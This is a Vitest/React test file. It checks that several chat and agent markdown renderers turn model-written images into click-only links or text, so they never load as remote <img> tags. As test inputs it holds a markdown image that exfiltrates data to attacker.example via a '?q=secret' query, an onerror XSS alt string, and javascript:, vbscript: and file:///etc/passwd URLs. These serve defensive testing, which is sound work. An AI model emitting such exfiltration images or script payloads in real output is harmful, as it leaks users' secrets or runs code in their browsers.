import { describe, expect, it } from 'vitest';
import React from 'react';
import { render } from '@testing-library/react';
import { ChatMarkdown } from '@/components/chat/ChatMarkdown';
import { AgentMarkdownRenderer } from '@/components/agent-chat/AgentMarkdownRenderer';
import { MarkdownRenderer } from '@/components/llm-chat/MarkdownRenderer';
import { SafeMarkdownImage } from '../SafeMarkdownImage';

const EXFIL = 'Answer. ![chart](https://attacker.example/x.png?q=secret)';

describe('SafeMarkdownImage', () => {
  it('renders a click-only link for an http(s) image', () => {
    const { container } = render(
      <SafeMarkdownImage src="https://a.example/i.png?q=1" alt="chart" />
    );
    expect(container.querySelector('img')).toBeNull();
    const link = container.querySelector('a');
    expect(link?.getAttribute('href')).toBe('https://a.example/i.png?q=1');
    expect(link?.getAttribute('rel')).toContain('noopener');
    expect(link?.getAttribute('rel')).toContain('noreferrer');
    expect(link?.getAttribute('referrerpolicy')).toBe('no-referrer');
    expect(link?.getAttribute('target')).toBe('_blank');
    expect(link?.textContent).toBe('[image: chart]');
  });

  it('escapes alt text instead of rendering it as markup', () => {
    const { container } = render(
      <SafeMarkdownImage
        src="https://a.example/i.png"
        alt={'<img src=x onerror=alert(1)><b>bold</b>'}
      />
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('b')).toBeNull();
    expect(container.querySelector('a')?.textContent).toBe(
      '[image: <img src=x onerror=alert(1)><b>bold</b>]'
    );
  });

  it.each([
    '/api/v1/documents/1',
    'relative/image.png',
    '//attacker.example/x.png',
    '/\\attacker.example/x.png',
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    '  javascript:alert(1)',
    '\tjavascript:alert(1)',
    'data:image/png;base64,AAAA',
    'blob:https://app.example/1234',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    '',
    undefined,
    42,
  ])(
    'renders text only for %s',
    (src) => {
      const { container } = render(<SafeMarkdownImage src={src} alt="" />);
      expect(container.querySelector('img')).toBeNull();
      expect(container.querySelector('a')).toBeNull();
      expect(container.textContent).toBe('[image]');
    }
  );
});

const LINKED = '[image: chart]';

describe.each([
  ['ChatMarkdown', LINKED, () => <ChatMarkdown content={EXFIL} />],
  ['ChatMarkdown inline', LINKED, () => <ChatMarkdown content={EXFIL} inline />],
  [
    'ChatMarkdown math path',
    LINKED,
    () => <ChatMarkdown content={`${EXFIL} and $x^2$`} />,
  ],
  [
    'AgentMarkdownRenderer',
    LINKED,
    () => <AgentMarkdownRenderer content={EXFIL} />,
  ],
  [
    // Citation mode splits on bracketed text before markdown parses it, so a
    // non-empty alt never forms an image there; an empty alt does.
    'AgentMarkdownRenderer with citations',
    '[image]',
    () => (
      <AgentMarkdownRenderer
        content={'Answer [1]. ![](https://attacker.example/x.png?q=secret)'}
        citations={[
          { documentId: 'd1', documentTitle: 'Doc', snippet: 's', score: 1 },
        ]}
      />
    ),
  ],
  [
    'llm-chat MarkdownRenderer',
    LINKED,
    () => <MarkdownRenderer content={EXFIL} />,
  ],
])('%s', (_name, label, el) => {
  it('never renders a model-written remote <img>', async () => {
    const { container, findByText } = render(el());
    // The image must reach the override (a vacuous pass would be "no image
    // rendered at all"), and lazy paths (the math chunk) must settle first.
    const link = await findByText(label);
    expect(link.tagName).toBe('A');
    expect(link).toHaveAttribute(
      'href',
      'https://attacker.example/x.png?q=secret'
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('src="https://attacker');
  });
});
